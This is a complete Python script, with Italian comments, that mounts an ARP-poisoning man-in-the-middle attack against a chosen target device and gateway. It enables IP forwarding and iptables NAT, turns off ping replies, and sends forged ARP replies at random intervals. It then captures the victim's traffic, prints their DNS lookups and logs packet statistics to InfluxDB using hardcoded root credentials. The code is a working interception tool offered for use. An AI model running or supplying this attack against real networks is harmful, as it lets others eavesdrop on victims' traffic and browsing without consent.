#!/usr/bin/python3
import optparse
import os
import random
import signal
import sys
import threading
from datetime import datetime

from influxdb import InfluxDBClient
from scapy.config import conf
from scapy.layers.dns import DNS
from scapy.layers.inet import TCP, UDP, IP
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import sniff, send, srp
from scapy.utils import wrpcap

gatewayIP = "192.168.1.1"
targetIP = "192.168.1.9"
interface = "wlp3s0"
interval = 10
sniff_pkt_count = 0
timeout_close = 60
conf.verb = 0
isReport = False
verbose = False
DEBUG = False
Bytes = 0
time_list = []
counter = dict(BFS=0, TOT=0, ARP=0, TCP=0, UDP=0, IP=0)
eventClose = threading.Event()


def get_mac_with_arp(ip_address):
    """ Get the MAC for ARP Request """
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address), timeout=2, retry=10)

    for s, r in responses:
        return r[Ether].src

    return None


def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    """ Restore the network with correct MAC and IP Address information """
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac, pdst=gateway_ip, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac, pdst=target_ip, psrc=gateway_ip), count=5)
    # Disable IP Forwarding on a mac
    ip_forward_off()


def killapp(signal=None, frame=None):
    """ Handler for SIGINT """
    print('\n You pressed Ctrl+C!')
    print("\n Stopping attack wait closing...")
    global eventClose
    eventClose.set()


def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac, stop):
    """ Sending false ARP reply for gateway and target """
    print(" Started ARP poison [CTRL-C to stop]")
    while not stop.is_set():
        # avvelena il target dicendo che in suo mac è quello del gateway
        send(ARP(op=2, hwdst=gateway_mac, pdst=gateway_ip, psrc=target_ip))
        # avvelena il gateway dicendo che in suo mac è quello del target
        send(ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=gateway_ip))
        stop.wait(random.randrange(10, 40))
    print(" Stopped ARP poison")


def ip_forward_on():
    """ funzione per abilitare l'ip forward """
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    # disable the ping response
    os.system("echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all")
    # funzione per scrivere le regole del firewall iptables
    os.system("iptables --flush")
    os.system("iptables --append FORWARD --in-interface {} --jump ACCEPT".format(interface))
    os.system("iptables --table nat --append POSTROUTING --out-interface {} --jump MASQUERADE".format(interface))


def ip_forward_off():
    """ funzione per disabilitare l'ip forward """
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    # enable the ping response
    os.system("echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_all")
    # funzione per pulire le regole del firewall
    os.system("iptables --flush")


def connectDB(host='localhost', port=8086):
    user = 'root'
    password = 'root'
    dbname = 'packets_db'

    db = InfluxDBClient(host, port, user, password, dbname)
    #db.drop_database(dbname)  # eliminare il db
    db.create_database(dbname)
    return db


def updaterCounterAndSaveDB(packets, bytes, db):
    counter["TOT"] += len(packets)
    counter["BFS"] = (bytes / interval)
    type = "None"

    for packet, time in zip(packets, time_list):
        if UDP in packet:
            type = "UDP"
            counter["UDP"] += 1
        else:
            if TCP in packet:
                type = "TCP"
                counter["TCP"] += 1
            else:
                if ARP in packet:
                    type = "ARP"
                    counter["ARP"] += 1
                else:
                    if IP in packet:
                        type = "IP"
                        counter["IP"] += 1

        if type != "None":
            #print(packet.summary() + packet.sprintf(" %Ether.src% -> %Ether.dst%"))
            json_body = [
                {
                    "measurement": "packet_info",
                    "time": time,
                    "tags": {
                        "String_proto": type
                    },
                    "fields": {
                        "Int_packet_tot": counter["TOT"],
                        "Int_packet_for_proto": counter[type],
                        "Float_bytes_for_sec": counter["BFS"],
                        "int_packet_byte": len(packet)
                    }
                }
            ]
            db.write_points(json_body)


def monitor_callback(packet):
    """ show dns query of target """
    global Bytes

    Bytes += len(packet)
    time_list.append(datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ'))
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        res = packet.sprintf(" Target: %IP.src%") + " Search: " + str(packet.getlayer(DNS).qd.qname.decode("utf-8"))
        return res

    if verbose:
        return packet.summary() + packet.sprintf(" %Ether.src% -> %Ether.dst%")


def set_options():
    global interface, gatewayIP, targetIP, isReport, verbose
    parser = optparse.OptionParser(description='Analysis network traffic with arp spoofing', prog='snifferpy')

    parser.add_option('-i', '--interface', help='Interface of capture network traffic')
    parser.add_option('-g', '--gateway', help='Gateway IP of router device')
    parser.add_option('-t', '--target', help='Target IP of device for analysis')
    #parser.add_option('-r', '--report', default=False, help='Generate report for wireshark')
    parser.add_option('-v', '--verbose', default=False, help='Verbose mode')

    options, args = parser.parse_args()
    interface = options.interface
    gatewayIP = options.gateway
    targetIP = options.target
    verbose = options.verbose
    #isReport = options.report

    if not interface or not gatewayIP or not targetIP:
        parser.print_help()
        sys.exit(1)


def main():
    global Bytes, isSTOP

    if not DEBUG:
        set_options()
    ip_forward_on()
    signal.signal(signal.SIGINT, handler=killapp)
    print(" Inizio sniffer del traffico su {}".format(interface))

    gatewayMac = get_mac_with_arp(gatewayIP)
    if gatewayMac is None:
        print("! Impossibile ottenere l'indirizzo MAC del gateway. Exiting..")
        sys.exit(1)

    targetMac = get_mac_with_arp(targetIP)
    if targetMac is None:
        print("! Impossibile ottenere l'indirizzo MAC del target. Exiting..")
        sys.exit(1)

    print(" Gateway IP: {} MAC: {}".format(gatewayIP, gatewayMac))
    print(" Target IP: {} MAC: {}\n".format(targetIP, targetMac))

    poison_thread = threading.Thread(target=arp_poison,
                                     args=(gatewayIP, gatewayMac, targetIP, targetMac, eventClose))
    poison_thread.start()
    influxdb = connectDB()
    sniff_filter = "ether host {}".format(targetMac)

    print(" Inizio cattura con filtro: {}".format(sniff_filter))
    print(" Per visualizzare i grafici accedere a http://localhost:8888")

    while not eventClose.is_set():
        Bytes = 0
        packets = sniff(filter=sniff_filter, iface=interface, count=sniff_pkt_count, timeout=interval,
                        prn=monitor_callback, store=1, stop_filter=lambda e: eventClose.is_set())

        updaterCounterAndSaveDB(packets, Bytes, influxdb)
    print(" Stopped Sniffer")

    print(counter)
    poison_thread.join(timeout_close)
    restore_network(gatewayIP, gatewayMac, targetIP, targetMac)
    if poison_thread.isAlive():
        print("! Critical Exit")
        os.kill(os.getpid(), signal.SIGTERM)
    sys.exit(0)


if __name__ == '__main__':
    main()
